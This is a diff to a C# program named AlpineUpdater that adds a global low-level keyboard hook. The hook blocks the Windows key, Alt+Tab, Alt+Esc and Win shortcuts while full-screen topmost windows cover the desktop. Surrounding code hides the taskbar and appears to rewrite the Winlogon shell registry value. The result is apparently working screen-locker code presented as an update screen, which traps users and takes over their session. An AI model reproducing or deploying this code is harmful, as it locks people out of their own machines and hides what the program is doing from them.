@@ -13,12 +13,45 @@ class AlpineUpdater {
     [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
     [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
+    [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")] static extern bool BringWindowToTop(IntPtr hWnd);
+
+    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
 
     const int SW_HIDE = 0;
     static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
     const uint SWP_NOSIZE = 0x0001;
     const uint SWP_NOMOVE = 0x0002;
     const uint SWP_NOACTIVATE = 0x0010;
+
+    const int WH_KEYBOARD_LL = 13;
+    const int HC_ACTION = 0;
+    const int WM_KEYDOWN = 0x0100;
+    const int WM_SYSKEYDOWN = 0x0104;
+    const int VK_TAB = 0x09;
+    const int VK_ESCAPE = 0x1B;
+    const int VK_MENU = 0x12;
+    const int VK_LWIN = 0x5B;
+    const int VK_RWIN = 0x5C;
+    const int VK_LEFT = 0x25;
+    const int VK_UP = 0x26;
+    const int VK_RIGHT = 0x27;
+    const int VK_DOWN = 0x28;
+    const int VK_D = 0x44;
+    const int VK_E = 0x45;
+    const int VK_R = 0x52;
+
+    static IntPtr keyboardHook = IntPtr.Zero;
+    static LowLevelKeyboardProc keyboardProc;
 
     const string ShellKeyPath = @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon";
 
@@ -59,9 +92,13 @@ class AlpineUpdater {
         onTop.Start();
 
         Form primary = covers[0];
+        primary.FormClosed += delegate { UninstallInputGuard(); };
         primary.Shown += delegate {
             if (workerStarted) return;
             workerStarted = true;
+            InstallInputGuard();
+            try { SetForegroundWindow(primary.Handle); } catch { }
+            try { BringWindowToTop(primary.Handle); } catch { }
             KeepOnTop();
             Thread worker = new Thread(RunUpdate);
             worker.IsBackground = true;
@@ -144,6 +181,52 @@ class AlpineUpdater {
             IntPtr tray = FindWindow("Shell_TrayWnd", null);
             if (tray != IntPtr.Zero) ShowWindow(tray, SW_HIDE);
         } catch { }
+    }
+
+    static void InstallInputGuard() {
+        if (keyboardHook != IntPtr.Zero) return;
+        try {
+            keyboardProc = new LowLevelKeyboardProc(KeyboardHookCallback);
+            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(null), 0);
+        } catch { }
+    }
+
+    static void UninstallInputGuard() {
+        try {
+            if (keyboardHook != IntPtr.Zero) {
+                UnhookWindowsHookEx(keyboardHook);
+                keyboardHook = IntPtr.Zero;
+            }
+        } catch { }
+    }
+
+    static bool IsKeyDown(int vKey) {
+        return (GetAsyncKeyState(vKey) & 0x8000) != 0;
+    }
+
+    static bool ShouldSwallow(int vkCode) {
+        bool winDown = IsKeyDown(VK_LWIN) || IsKeyDown(VK_RWIN);
+        bool altDown = IsKeyDown(VK_MENU);
+
+        if (vkCode == VK_LWIN || vkCode == VK_RWIN) return true;
+        if (vkCode == VK_TAB && altDown) return true;
+        if (vkCode == VK_ESCAPE && altDown) return true;
+        if (winDown && (vkCode == VK_LEFT || vkCode == VK_RIGHT || vkCode == VK_UP || vkCode == VK_DOWN)) return true;
+        if (winDown && (vkCode == VK_D || vkCode == VK_E || vkCode == VK_R)) return true;
+        return false;
+    }
+
+    static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode == HC_ACTION) {
+            try {
+                int message = wParam.ToInt32();
+                if (message == WM_KEYDOWN || message == WM_SYSKEYDOWN) {
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    if (ShouldSwallow(vkCode)) return (IntPtr)1;
+                }
+            } catch { }
+        }
+        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
     }
 
     static void SetShell(string value) {
